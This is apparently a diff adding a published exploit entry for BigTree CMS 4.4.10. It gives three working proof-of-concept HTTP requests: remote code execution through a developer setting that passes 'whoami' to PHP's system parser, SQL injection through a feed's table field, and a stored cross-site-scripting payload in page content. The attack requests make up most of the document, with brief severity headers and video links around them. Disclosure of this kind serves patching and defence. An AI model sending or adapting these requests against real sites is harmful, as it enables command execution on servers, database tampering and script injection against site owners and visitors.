@@ -1,0 +1,95 @@
+# Exploit Title: BigTree CMS 4.4.10 - Remote Code Execution
+# Google Dork: " BigTree CMS "
+# Date: 2020-25-09
+# Exploit Author: SunCSR (ThienNV and HoaVT - Sun* Cyber Security Research)
+# Vendor Homepage: https://www.bigtreecms.org/
+# Software Link: https://www.bigtreecms.org/
+# Version: 4.4.10
+# Tested on: Windows
+# CVE : N/A
+
+## 1. Authenticated Remote Code Execution
+
+# Attack type: Remote
+# Impact: Remote arbitrary code execution
+# Affected component(s): /core/admin/field-types/list/draw.php
+# Attack vectors: Authenticated user (developer) can inject malicious command to the applications via crete new setting function:
+# Description: BigTree 4.4.10  and earlier are vulnerable to Authenticated Remote Code Execution vulnerability. An authenticated user (developer) can send a crafted request to the server and perform remote command execution (RCE).
+# Severity (CVSS 3.1): Base Score: 9.1 CRITICAL
+# POC: Developer create setting and code will be executed when load settings:
+
+POST /BigTreeCMS/site/index.php/admin/developer/settings/create/ HTTP/1.1
+Host: xxxx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 388
+Origin: http://xxxx
+Connection: close
+Referer: http://xxxx/BigTreeCMS/site/index.php/admin/developer/settings/add/
+Cookie: PHPSESSID=ipmr6c2jplqqlgcdrkgbtg4tfl; bigtree_admin[email]=tadmin%40bigtree.com; bigtree_admin[login]=%5B%22session-5f6d51f54fc301.14043773%22%2C%22chain-5f6d51f54fb248.84144127%22%5D
+Upgrade-Insecure-Requests: 1
+
+__csrf_token_PEFN3BUK0DAXK7Y10NJWT5E4813WXTXB__=tx6rzTz4ddDFI60tfcBe8tDN7lJ2YA3WlcdPLm/EbeY=&id=Test rce&name=Test rce&type=list&settings={"list_type":"static","allow-empty":"Yes","list":"whoami","pop-table":"","parser":"system"}&description=<p>Test rce</p>
+
+# Video: https://vimeo.com/461667065
+
+## 2. Authenticated SQL Injection
+# Attack type: Remote
+#Impact: Authenticated SQl Injection in BigTree CMS
+# Attack vectors: Authenticated user (developer) can inject malicious SQL query to the applications via crete new feed function:
+# Affected component(s): /core/feeds/custom.php
+# Description:BigTree 4.4.10  and earlier are vulnerable to Authenticated SQL Injection vulnerability. An authenticated user (developer) can send a malicious sql query to the server and perform sql query.
+# Severity (CVSS 3.1): Base Score: 7.2 HIGH
+# POC: Request create or edit feed: 
+
+POST /site/index.php/admin/developer/feeds/create/ HTTP/1.1
+Host: xxxx
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 379
+Origin: http://xxxx
+Connection: close
+Referer: http://xxxx/site/index.php/admin/developer/feeds/add/
+Cookie: yyyy
+
+__csrf_token_RW2U3KT3JXVY70AKWPV9UHG3HWQ12PP4__=S0%2B7MADREPOzg1%2Fkht7xbgzv0uKqrRpuccn2gOmft88%3D&name=SQL+Injection&table=sqli_test+union+select+sleep(5)%23&type=custom&settings=%7B%22sort%22%3A%22%60id%60+ASC%22%2C%22limit%22%3A%222%22%2C%22parser%22%3A%22system%2Cexec%22%7D&description=as&fields%5Bid%5D%5Bwidth%5D=&fields%5Bid%5D%5Btitle%5D=ID&fields%5Bid%5D%5Bparser%5D=12
+
+# Video: https://vimeo.com/461667107
+
+## 3. Authenticated Stored Cross-Site Scripting
+# Attack type: Remote
+# Impact: Stored XSS
+# Affected component(s): site/index.php/admin/pages/update
+# Attack vector(s): Authenticated user (developer) can inject malicious Javascript to the applications via crete or update page function:
+# Description: Stored XSS vulnerabilities in the BigTree 4.4.10  and earlier allow remote authenticated user with low privilege (editor or publisher) to inject arbitrary web script or HTML via the page content to site/index.php/admin/pages/update
+# Severity (CVSS 3): Base Score: 6.5 MEDIUM
+# POC: Request create or edit page:
+
+POST /BigTreeCMS/site/index.php/admin/pages/update/ HTTP/1.1
+Host: xxxx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------2320192840320212926996245368
+Content-Length: 12173
+Origin: http://xxx
+Connection: close
+Referer: http://xxxx/BigTreeCMS/site/index.php/admin/pages/edit/2/
+Cookie: yyyy
+
+---some fields here---
+
+<p>&nbsp;<span class="s1"><em>These people are ridiculous and fake. This page is an example of a </em><a href="https://www.bigtreecms.org/docs/dev-guide/templates/" target="_blank" rel="noopener"><span class="s2"><em>basic template</em></span></a><em> with page content and a set of </em><a href="https://www.bigtreecms.org/docs/dev-guide/callouts/" target="_blank" rel="noopener"><span class="s2"><em>callouts</em></span></a><em>. Go to the </em><a href="https://www.bigtreecms.org/docs/dev-guide/installation/" target="_blank" rel="noopener"><span class="s2"><em>BigTree Developer Guide</em></span></a><em> for more.</em></span></p>
+<p><span class="s1"><em>XSS here <script>alert(origin)</script></em></span></p>
+-----------------------------2320192840320212926996245368	
+
+---some fields here---
+
+# Video: https://vimeo.com/461667129
